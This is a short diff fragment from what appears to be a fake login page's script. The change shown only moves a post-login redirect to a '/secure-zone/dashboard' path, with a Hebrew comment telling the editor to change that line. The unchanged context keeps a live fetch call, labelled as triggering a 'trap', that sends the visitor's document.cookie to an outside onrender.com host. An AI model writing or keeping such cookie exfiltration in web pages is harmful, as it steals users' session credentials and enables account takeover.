@@ -31,7 +31,8 @@
             
             // 2. Trigger the "trap" - send the cookie to the attacker's server
             fetch('https://python-pickwiz.onrender.com/log?cookie=' + encodeURIComponent(document.cookie));
-            window.location.href = "/dashboard";
+            // שנה את השורה הזו בקובץ ה-HTML
+window.location.href = "/secure-zone/dashboard";
             alert("Logged in successfully!");
         });
     </script>
